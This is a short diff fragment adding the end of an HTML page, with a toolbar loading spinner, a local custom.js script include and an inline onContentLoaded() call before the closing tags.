+        <div id="niu2-toolbar-load" data-loading-icon="icon-spin icon-4x icon-spinner"></div>
+        <script type="text/javascript" src="/js/custom.js"></script>
+        <script type="text/javascript">
+            onContentLoaded();
+        </script>
+    </body>
+</html>
